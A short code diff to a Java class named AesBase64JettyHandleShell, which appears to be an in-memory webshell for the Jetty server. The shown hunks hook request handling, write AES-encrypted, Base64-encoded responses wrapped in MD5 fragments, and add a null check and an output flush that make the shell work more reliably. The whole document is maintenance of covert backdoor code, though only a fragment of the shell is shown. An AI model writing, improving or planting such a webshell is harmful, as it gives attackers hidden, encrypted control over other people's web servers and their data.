@@ -189,8 +189,10 @@ public class AesBase64JettyHandleShell extends ClassLoader implements Invocation
                 Object servletResponse = args[3];
                 if (run(servletRequest, servletResponse)) {
                     Method setHandledMethod = getMethodByClass(baseRequest.getClass(), "setHandled", boolean.class);
-                    setHandledMethod.setAccessible(true);
-                    setHandledMethod.invoke(baseRequest, true);
+                    if (setHandledMethod != null) {
+                        setHandledMethod.setAccessible(true);
+                        setHandledMethod.invoke(baseRequest, true);
+                    }
                     next = false;
                 }
             } catch (Throwable ignored) {
@@ -366,6 +368,7 @@ public class AesBase64JettyHandleShell extends ClassLoader implements Invocation
                                     printWriter.write(md5.substring(0, 16));
                                     printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                     printWriter.write(md5.substring(16));
+                                    printWriter.flush();
                                     return true;
                                 }
                             }
